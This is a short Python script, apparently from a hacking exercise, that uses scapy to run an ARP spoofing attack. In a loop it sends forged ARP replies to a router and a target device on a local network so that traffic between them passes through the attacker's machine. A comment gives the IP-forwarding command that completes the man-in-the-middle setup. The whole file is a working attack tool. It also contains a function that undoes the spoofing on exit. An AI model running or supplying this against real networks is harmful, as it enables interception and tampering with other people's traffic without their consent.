#!usr/bin/env python3

import scapy.all as scapy
import time

router_ip = "192.168.1.1"
target_device_ip = "192.168.1.19"

# for ip forwarding through machine as a router: echo 1 > /proc/sys/net/ipv4/ip_forward in terminal

# target_mac = "18:01:f1:4a:5b:b7"

# scan network for clients devices
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


# send a packet for target computer to think you're the router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# restoring to normal state
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
try:
    while True:
        spoof(target_device_ip, router_ip)
        spoof(router_ip, target_device_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\r\nDetected ctrl-c. Resetting to normal")
    restore(target_device_ip, router_ip)
    restore(router_ip, target_device_ip)
